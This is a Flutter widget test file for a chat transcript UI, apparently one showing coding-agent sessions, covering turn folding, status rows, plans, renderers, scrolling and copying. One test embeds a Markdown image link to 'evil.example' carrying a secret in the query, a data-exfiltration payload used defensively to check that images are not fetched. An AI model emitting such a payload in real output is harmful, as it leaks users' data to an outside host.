import 'package:coqui_acp_chat/coqui_acp_chat.dart';
import 'package:coqui_acp_chat_ui/coqui_acp_chat_ui.dart';
import 'package:flutter/gestures.dart' show PointerDeviceKind;
import 'package:material_ui/material_ui.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';

import 'fixtures.dart';

Widget transcript(
  List<ChatEntryData> entries, {
  ChatDensity? density,
  ChatRenderers renderers = ChatRenderers.none,
  List<PlanEntry> plan = const [],
  bool working = false,
  Map<String, TerminalView> terminals = const {},
  List<TurnSpan> turns = const [],
  DateTime Function()? clock,
  String? agentName,
  Key? key,
}) => host(
  SizedBox(
    width: 900,
    height: 700,
    child: ChatTranscript(key: key, entries: entries, density: density, renderers: renderers, plan: plan, working: working, terminals: terminals, turns: turns, clock: clock ?? DateTime.now, agentName: agentName),
  ),
);

void main() {
  testWidgets('Normal folds a finished turn into Worked for, and opens into its burst, then its cards', (tester) async {
    await tester.pumpWidget(transcript(worked()));
    expect(find.textContaining('Worked for 40s'), findsOneWidget);
    expect(find.textContaining('Edited calc.js, ran a command'), findsOneWidget);
    expect(find.byType(ToolCard), findsNothing);
    expect(find.textContaining('I fixed'), findsOneWidget, reason: 'the answer stays');

    await tester.tap(find.textContaining('Worked for 40s'));
    await tester.pump();
    // Inside: the thought, and the burst as one line.
    expect(find.text('Thinking'), findsOneWidget);
    expect(find.byType(ToolBurst), findsOneWidget);

    await tester.tap(find.descendant(of: find.byType(ToolBurst), matching: find.byType(FoldLine)));
    await tester.pump();
    expect(find.byType(ToolCard), findsNWidgets(2));
    expect(find.text('Edit calc.js'), findsOneWidget);
  });

  testWidgets('Thinking shows the thought and one line for the burst, and Verbose a card for each tool', (tester) async {
    await tester.pumpWidget(transcript(worked(), density: ChatDensity.thinking));
    expect(find.text('Thinking'), findsOneWidget);
    expect(find.textContaining('Worked for'), findsNothing);
    expect(find.byType(ToolBurst), findsOneWidget);
    expect(find.byType(ToolCard), findsNothing);

    await tester.pumpWidget(transcript(worked(), density: ChatDensity.verbose));
    expect(find.byType(ToolBurst), findsNothing);
    expect(find.byType(ToolCard), findsNWidgets(2));
  });

  testWidgets('the look decides the density when the transcript is not told', (tester) async {
    await tester.pumpWidget(MaterialApp(
      theme: ThemeData(extensions: [ChatLook.fromScheme(const ColorScheme.dark(), density: ChatDensity.verbose)]),
      home: Scaffold(body: SizedBox(width: 900, height: 700, child: ChatTranscript(entries: worked()))),
    ));
    expect(find.byType(ToolCard), findsNWidgets(2));
  });

  testWidgets('a failed call stays open as a card while the others fold', (tester) async {
    final failed = tool('f', kind: 'execute', title: 'npm test', status: 'failed', content: [
      {'type': 'content', 'content': {'type': 'text', 'text': 'exit 1: boom'}},
    ]);
    final entries = [user('go', 0), toolEntry(tool('a', kind: 'read'), 1), toolEntry(failed, 2), agent('it failed', 3)];
    await tester.pumpWidget(transcript(entries));
    expect(find.byType(ToolBurst), findsOneWidget);
    expect(find.byType(ToolCard), findsOneWidget);
    expect(find.text('exit 1: boom'), findsOneWidget, reason: 'a failure opens by itself');
  });

  group('while the agent works', () {
    String headline(WidgetTester tester) =>
        tester.widget<Text>(find.descendant(of: find.byKey(const Key('working-row')), matching: find.byType(Text)).first).data!;

    testWidgets('the last row says what the newest entry is doing, and for how long', (tester) async {
      var now = t0.add(const Duration(seconds: 5));
      final turns = [TurnSpan(id: 1, startedAt: t0)];
      Future<void> show(List<ChatEntryData> entries) =>
          tester.pumpWidget(transcript(entries, working: true, turns: turns, clock: () => now, agentName: 'Claude'));

      await show([user('go', 0)]);
      expect(headline(tester), 'Starting Claude…');
      expect(find.text('5s'), findsOneWidget);
      await show([user('go', 0), agent('done', 1), user('next', 2)]);
      expect(headline(tester), 'Working\u2026', reason: 'a session that has answered is not starting again');
      await show([user('go', 0), thought('hm', 1)]);
      expect(headline(tester), 'Thinking…');
      await show([user('go', 0), agent('first', 1), user('next', 2)]);
      expect(headline(tester), 'Working…', reason: 'warm turns say Working instead of Starting again');
      await show([user('go', 0), toolEntry(tool('a', kind: 'execute', title: 'cargo test', status: 'in_progress'), 1)]);
      expect(headline(tester), 'Running cargo test…');
      await show([user('go', 0), toolEntry(tool('a', kind: 'edit', title: 'Edit', status: 'in_progress', content: [diff('src/calc.js', 'a', 'b')]), 1)]);
      expect(headline(tester), 'Editing calc.js…');
      await show([user('go', 0), toolEntry(tool('a', kind: 'read'), 1), agent('Here', 2)]);
      expect(headline(tester), 'Responding…');

      now = t0.add(const Duration(seconds: 84));
      await tester.pump(const Duration(seconds: 1));
      expect(find.text('1m 24s'), findsOneWidget);
    });

    testWidgets('there is no row when the agent is idle', (tester) async {
      await tester.pumpWidget(transcript(worked()));
      expect(find.byKey(const Key('working-row')), findsNothing);
    });

    testWidgets('each second rebuilds the row alone, not the conversation', (tester) async {
      var drawn = 0;
      final renderers = ChatRenderers(entry: [
        (context, entry) {
          if (entry.role == MessageRole.notice) drawn++;
          return null;
        },
      ]);
      var now = t0;
      final entries = [user('go', 0), ChatEntry(MessageRole.notice, 'n', at: t0), thought('hm', 1)];
      await tester.pumpWidget(transcript(entries, working: true, renderers: renderers, turns: [TurnSpan(id: 1, startedAt: t0)], clock: () => now));
      final before = drawn;
      expect(before, greaterThan(0));
      for (var i = 1; i <= 3; i++) {
        now = t0.add(Duration(seconds: i));
        await tester.pump(const Duration(seconds: 1));
      }
      expect(find.text('3s'), findsOneWidget);
      expect(drawn, before);
    });

    testWidgets('the mark pulses, and stands still when the system asks for no animation', (tester) async {
      await tester.pumpWidget(transcript([user('go', 0)], working: true));
      expect(tester.binding.transientCallbackCount, greaterThan(0));
      await tester.pumpWidget(MediaQuery(data: const MediaQueryData(disableAnimations: true), child: transcript([user('go', 0)], working: true)));
      await tester.pump();
      expect(tester.binding.transientCallbackCount, 0);
    });

    testWidgets('the running work is a block that opens, and keeps its state when the turn ends', (tester) async {
      ChatEntry mine(ChatEntry e) => ChatEntry(e.role, e.text, at: e.at, tool: e.tool, turn: 1);
      final entries = [
        for (final e in [user('go', 0), thought('hm', 1), toolEntry(tool('a', kind: 'read', locations: [{'path': 'a.dart'}]), 2)]) mine(e),
      ];
      await tester.pumpWidget(transcript(entries, working: true, turns: [TurnSpan(id: 1, startedAt: t0)]));
      expect(find.textContaining('Working · '), findsOneWidget);
      expect(find.text('Thinking'), findsNothing);
      await tester.tap(find.textContaining('Working · '));
      await tester.pump();
      expect(find.text('Thinking'), findsOneWidget, reason: 'the running block keeps the thoughts');

      final done = [...entries, mine(agent('Done', 30))];
      await tester.pumpWidget(transcript(done, turns: [TurnSpan(id: 1, startedAt: t0, endedAt: t0.add(const Duration(seconds: 30)))]));
      expect(find.textContaining('Worked for 30s'), findsOneWidget);
      expect(find.text('Thinking'), findsOneWidget, reason: 'the same line, still open');
    });
  });

  testWidgets('a turn still running keeps its tool that waits as a card', (tester) async {
    final entries = [user('go', 0), toolEntry(tool('a', kind: 'edit', title: 'Edit a.txt', status: 'pending'), 1)];
    await tester.pumpWidget(transcript(entries, working: true));
    expect(find.byType(ToolCard), findsOneWidget);
    expect(find.textContaining('Worked for'), findsNothing);
  });

  testWidgets('the plan is a live checklist at the end of the conversation', (tester) async {
    final plan = [
      const PlanEntry('Read addNumbers', PlanStatus.done),
      const PlanEntry('Change subtraction to addition', PlanStatus.running),
      const PlanEntry('Check the result', PlanStatus.pending),
    ];
    await tester.pumpWidget(transcript(worked(), plan: plan));
    expect(find.byKey(const Key('plan-checklist')), findsOneWidget);
    expect(find.text('Plan: 1 of 3'), findsOneWidget);
    expect(find.text('Check the result'), findsOneWidget);
    expect(find.byIcon(Icons.check_circle_outline), findsOneWidget);
    expect(find.byIcon(Icons.timelapse), findsOneWidget);
    expect(find.byIcon(Icons.radio_button_unchecked), findsOneWidget);
    // After the answer, not above the composer.
    expect(tester.getTopLeft(find.byKey(const Key('plan-checklist'))).dy, greaterThan(tester.getTopLeft(find.textContaining('I fixed')).dy));
  });

  testWidgets('no plan, no checklist', (tester) async {
    await tester.pumpWidget(transcript(worked()));
    expect(find.byKey(const Key('plan-checklist')), findsNothing);
  });

  testWidgets('a command a tool ran shows its output from the terminals', (tester) async {
    final view = TerminalView(limits)
      ..apply({'sessionUpdate': 'terminal_update', 'command': 'ls', 'output': {'data': 'YS50eHQK'}, 'exitStatus': {'exitCode': 2}}, limits);
    final call = tool('t', kind: 'execute', title: 'ls', content: [{'type': 'terminal', 'terminalId': 'term-1'}], status: 'failed');
    await tester.pumpWidget(transcript([user('go', 0), toolEntry(call, 1)], terminals: {'term-1': view}));
    expect(find.text(r'$ ls'), findsOneWidget);
    expect(find.text('exit 2'), findsOneWidget);
  });

  group('renderers', () {
    testWidgets('an entry renderer draws what it knows and leaves the rest', (tester) async {
      final renderers = ChatRenderers(entry: [
        (context, entry) => entry.role == MessageRole.notice && entry.text.startsWith('chart:') ? Text('CHART ${entry.text.substring(6)}') : null,
      ]);
      final entries = [
        user('hi', 0),
        ChatEntry(MessageRole.notice, 'chart:sales', at: t0),
        ChatEntry(MessageRole.notice, 'plain notice', at: t0),
      ];
      await tester.pumpWidget(transcript(entries, renderers: renderers));
      expect(find.text('CHART sales'), findsOneWidget);
      expect(find.text('plain notice'), findsOneWidget);
    });

    testWidgets('a tool renderer replaces the card of its kind only', (tester) async {
      final renderers = ChatRenderers(tool: {'delegate': (context, call) => Text('DELEGATED ${call.title}')});
      final entries = [
        user('go', 0),
        toolEntry(tool('d', kind: 'delegate', title: 'Review the diff', status: 'in_progress'), 1),
        toolEntry(tool('e', kind: 'edit', title: 'Edit x', status: 'in_progress'), 2),
      ];
      await tester.pumpWidget(transcript(entries, renderers: renderers, working: true));
      expect(find.text('DELEGATED Review the diff'), findsOneWidget);
      expect(find.byType(ToolCard), findsOneWidget);
      expect(find.text('Edit x'), findsOneWidget);
    });

    testWidgets('a block renderer draws a piece of a tool call, and the package draws the others', (tester) async {
      final renderers = ChatRenderers(block: [
        (context, call, block) => block is ToolText && block.text.startsWith('{') ? const Text('JSON VIEW') : null,
      ]);
      final call = tool('t', kind: 'fetch', title: 'GET', status: 'failed', content: [
        {'type': 'content', 'content': {'type': 'text', 'text': '{"a":1}'}},
        {'type': 'content', 'content': {'type': 'text', 'text': 'plain text'}},
      ]);
      await tester.pumpWidget(transcript([user('go', 0), toolEntry(call, 1)], renderers: renderers, density: ChatDensity.verbose));
      expect(find.text('JSON VIEW'), findsOneWidget);
      expect(find.text('plain text'), findsOneWidget);
      expect(find.text('{"a":1}'), findsNothing);
    });

    testWidgets('a burst, a work and a plan renderer replace their lines', (tester) async {
      final renderers = ChatRenderers(
        burst: (context, summary, tools, cards) => Text('BURST ${tools.length}: ${summary.text}'),
        work: (context, duration, summary, items) => Text('WORK ${duration.inSeconds}'),
        plan: (context, plan) => Text('PLAN ${plan.length}'),
      );
      await tester.pumpWidget(transcript(worked(), renderers: renderers, plan: const [PlanEntry('a', PlanStatus.pending)]));
      expect(find.text('WORK 40'), findsOneWidget);
      expect(find.text('PLAN 1'), findsOneWidget);
      await tester.pumpWidget(transcript(worked(), renderers: renderers, density: ChatDensity.thinking));
      expect(find.text('BURST 2: Edited calc.js, ran a command'), findsOneWidget);
    });

    test('merge puts the other registry first and over', () {
      final a = ChatRenderers(entry: [(c, e) => null], tool: {'x': (c, t) => const Placeholder()}, plan: (c, p) => const Placeholder());
      final b = ChatRenderers(entry: [(c, e) => null], tool: {'x': (c, t) => const Text('b'), 'y': (c, t) => const Text('y')});
      final merged = a.merge(b);
      expect(merged.entry, hasLength(2));
      expect(merged.entry.first, b.entry.first);
      expect(merged.tool.keys, containsAll(['x', 'y']));
      expect(merged.tool['x'], b.tool['x']);
      expect(merged.plan, a.plan);
    });
  });

  testWidgets('one small wheel step up during a streamed turn stops following and the view stays put as chunks arrive', (tester) async {
    final entries = [for (var i = 0; i < 40; i++) agent('line $i', i)];
    final key = GlobalKey<ChatTranscriptState>();
    await tester.pumpWidget(transcript(entries, key: key, working: true));
    await tester.pump();
    final list = find.byType(ListView);
    ScrollPosition position() => tester.widget<ListView>(list).controller!.position;
    expect(key.currentState!.following, isTrue);
    expect(position().extentAfter, 0);

    // A wheel step far smaller than the "near the end" band.
    final mouse = TestPointer(1, PointerDeviceKind.mouse);
    await tester.sendEventToBinding(mouse.hover(tester.getCenter(list)));
    await tester.sendEventToBinding(mouse.scroll(const Offset(0, -6)));
    await tester.pump();
    expect(key.currentState!.following, isFalse);
    final offset = position().pixels;

    // Chunks keep arriving: the view does not move.
    for (var i = 0; i < 3; i++) {
      entries.add(agent('chunk $i\nmore\nlines', 41 + i));
      await tester.pumpWidget(transcript([...entries], key: key, working: true));
      await tester.pump();
      expect(position().pixels, offset, reason: 'a detached view is never moved by streaming');
      expect(key.currentState!.following, isFalse);
    }
    expect(find.byTooltip('Jump to latest'), findsOneWidget);

    await tester.tap(find.byTooltip('Jump to latest'));
    await tester.pump();
    await tester.pump();
    expect(key.currentState!.following, isTrue);
    expect(position().extentAfter, 0);
  });

  testWidgets('a person scrolled away is not dragged to the end, and the button brings them back', (tester) async {
    final entries = [for (var i = 0; i < 40; i++) agent('line $i', i)];
    final key = GlobalKey<ChatTranscriptState>();
    await tester.pumpWidget(transcript(entries, key: key));
    expect(key.currentState!.following, isTrue);
    await tester.drag(find.byType(ListView), const Offset(0, 600));
    await tester.pump();
    expect(key.currentState!.following, isFalse);
    expect(find.byTooltip('Jump to latest'), findsOneWidget);
    await tester.tap(find.byTooltip('Jump to latest'));
    await tester.pump();
    await tester.pump();
    expect(key.currentState!.following, isTrue);
    expect(find.byTooltip('Jump to latest'), findsNothing);
  });

  testWidgets('Markdown from an agent fetches no image and copies a link instead of opening it', (tester) async {
    await tester.pumpWidget(host(const AgentMarkdown(text: '![the secret](https://evil.example/?d=secret) [a link](https://example.org/x)')));
    expect(find.text('[image: the secret]'), findsOneWidget);
    expect(find.byType(Image), findsNothing);
  });

  test('conversationText gives each entry by what it shows', () {
    expect(
      conversationText(worked()),
      'Fix addNumbers\n\nThinking\n\nEdit calc.js\n\nnode -e addNumbers(2,3)\n\nI fixed addNumbers in src/calc.js.',
    );
  });

  testWidgets('streamed thoughts show live while working and a 5px upward drag stays unpinned', (tester) async {
    final entries = [
      for (var i = 0; i < 40; i++) agent('line $i', i),
      user('explain', 40),
      thought('checking step by step', 41),
    ];
    final key = GlobalKey<ChatTranscriptState>();
    await tester.pumpWidget(transcript(entries, key: key, working: true));
    await tester.pump();
    expect(find.text('checking step by step'), findsOneWidget);
    expect(key.currentState!.following, isTrue);

    await tester.drag(find.byType(ListView), const Offset(0, 26));
    await tester.pump();
    expect(key.currentState!.following, isFalse);

    // Further streaming updates keep the viewport unpinned while scrolled up.
    await tester.pumpWidget(transcript([...entries, agent('more text', 42)], key: key, working: true));
    await tester.pump();
    expect(key.currentState!.following, isFalse);
  });

  testWidgets('Select all then copy gives the whole conversation, built or not', (tester) async {
    final entries = [for (var i = 0; i < 60; i++) agent('line $i', i)];
    String? copied;
    tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, (call) async {
      if (call.method == 'Clipboard.setData') copied = (call.arguments as Map)['text'] as String;
      return null;
    });
    addTearDown(() => tester.binding.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, null));
    final key = GlobalKey<ChatTranscriptState>();
    await tester.pumpWidget(transcript(entries, key: key));
    await key.currentState!.selection!.copyAll();
    expect(copied, contains('line 0'));
    expect(copied, contains('line 59'));
  });

  group('dragging over the conversation copies what it covers', () {
    String? copied;

    setUp(() {
      copied = null;
      TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, (call) async {
        if (call.method == 'Clipboard.setData') copied = (call.arguments as Map)['text'] as String;
        return null;
      });
    });
    tearDown(() => TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(SystemChannels.platform, null));

    /// Drags from the start of [from] to the end of [to] in a transcript tall enough to build every entry, then presses Ctrl+C.
    Future<String?> dragCopy(WidgetTester tester, List<ChatEntryData> entries, String from, String to) async {
      tester.view.physicalSize = const Size(900, 2400);
      tester.view.devicePixelRatio = 1;
      addTearDown(tester.view.reset);
      await tester.pumpWidget(host(ChatTranscript(entries: entries, density: ChatDensity.verbose)));
      await tester.pump();
      final start = tester.getTopLeft(find.text(from)) + const Offset(1, 5);
      final end = tester.getBottomRight(find.text(to)) - const Offset(1, 5);
      final gesture = await tester.startGesture(start, kind: PointerDeviceKind.mouse);
      await tester.pump();
      await gesture.moveTo(end);
      await tester.pump();
      await gesture.up();
      await tester.pump();
      await tester.sendKeyDownEvent(LogicalKeyboardKey.controlLeft);
      await tester.sendKeyEvent(LogicalKeyboardKey.keyC);
      await tester.sendKeyUpEvent(LogicalKeyboardKey.controlLeft);
      await tester.pump();
      return copied;
    }

    testWidgets('a message, a paragraph, a code block and a list, each on lines of their own', (tester) async {
      final entries = [
        user('Question', 0),
        agent('First paragraph.\n\nSecond paragraph.\n\n```\ncode a\ncode b\n```\n\n- item one\n- item two\n\n1. step', 1),
        agent('The end', 2),
      ];
      expect(
        await dragCopy(tester, entries, 'Question', 'The end'),
        'Question\n\nFirst paragraph.\nSecond paragraph.\ncode a\ncode b\nitem one\nitem two\nstep\n\nThe end',
      );
    });

    testWidgets('a tool call, its output and a change, without the blank lines at the ends', (tester) async {
      final entries = [
        user('Run it', 0),
        toolEntry(tool('t', kind: 'execute', title: 'cargo test', status: 'failed', content: [{'type': 'content', 'content': {'type': 'text', 'text': 'OUT 1\nOUT 2'}}]), 1),
        toolEntry(tool('u', kind: 'edit', title: 'Edit a.js', status: 'failed', content: [diff('a.js', 'x\n', 'y\n')]), 2),
        agent('Done', 3),
      ];
      final text = await dragCopy(tester, entries, 'Run it', 'Done');
      expect(text, startsWith('Run it\n\ncargo test\nOUT 1\nOUT 2\n\nEdit a.js\na.js\n'));
      expect(text, contains('- x\n+ y'));
      expect(text, endsWith('\n\nDone'));
      expect(tester.takeException(), isNull, reason: 'a drag across a change does not trip the nested scrollables');
    });

    testWidgets('part of one code block is copied alone', (tester) async {
      final entries = [agent('```\nalpha\nbeta\n```', 0)];
      expect(await dragCopy(tester, entries, 'alpha\nbeta', 'alpha\nbeta'), 'alpha\nbeta');
    });

    testWidgets('every kind of entry is in a Select all: message, Markdown, thought, tool, output, change, plan', (tester) async {
      final entries = [
        user('Q one', 0),
        thought('pondering', 1),
        toolEntry(tool('t', kind: 'execute', title: 'cargo test', status: 'failed', content: [{'type': 'content', 'content': {'type': 'text', 'text': 'OUTPUT'}}]), 2),
        toolEntry(tool('u', kind: 'edit', title: 'Edit a.js', status: 'failed', content: [diff('a.js', 'x\n', 'y\n')]), 3),
        agent('**bold** answer', 4),
      ];
      tester.view.physicalSize = const Size(900, 2400);
      tester.view.devicePixelRatio = 1;
      addTearDown(tester.view.reset);
      await tester.pumpWidget(host(ChatTranscript(
        entries: entries,
        density: ChatDensity.verbose,
        plan: const [PlanEntry('write the test', PlanStatus.pending)],
      )));
      await tester.pump();
      tester.state<SelectableRegionState>(find.byType(SelectableRegion)).selectAll(SelectionChangedCause.toolbar);
      await tester.pump();
      Actions.invoke(tester.element(find.descendant(of: find.byType(SelectableRegion), matching: find.byType(Text)).first), CopySelectionTextIntent.copy);
      await tester.pump();
      for (final part in ['Q one', 'Thinking', 'cargo test', 'OUTPUT', 'Edit a.js', '+ y', 'bold answer', 'write the test']) {
        expect(copied, contains(part));
      }
    });
  });
}
